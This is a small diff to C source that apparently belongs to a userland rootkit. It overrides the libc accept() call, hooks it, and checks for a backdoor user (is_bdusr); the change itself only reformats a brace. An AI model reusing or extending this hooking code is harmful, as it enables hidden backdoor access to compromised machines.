@@ -11,8 +11,7 @@ int hijack_accept(int sockfd, struct sockaddr *addr){
     return sockfd;
 }
 
-int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
-{
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen){
     hook(CACCEPT);
     if(is_bdusr()) return (long)call(CACCEPT, sockfd, addr, addrlen);
 
